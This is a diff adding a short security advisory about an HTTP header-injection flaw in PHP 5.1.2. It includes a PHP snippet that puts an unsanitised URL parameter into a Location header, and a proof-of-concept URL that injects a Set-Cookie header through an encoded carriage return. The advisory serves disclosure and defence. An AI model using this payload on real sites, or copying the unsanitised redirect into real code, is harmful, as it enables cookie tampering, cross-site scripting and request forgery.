@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/55297/info
+
+PHP is prone to a vulnerability that allows attackers to inject arbitrary headers through a URL.
+
+By inserting arbitrary headers, attackers may be able to launch cross-site request-forgery, cross-site scripting, HTML-injection, and other attacks.
+
+PHP 5.1.2 is vulnerable; other versions may also be affected. 
+
+<?php
+header('Location: '.$_GET['url']);
+print_r($_COOKIE);
+?>
+
+http://www.example.com/head1.php?url=http://example.com/head1.php%0DSet-Cookie:+NAME=foo 
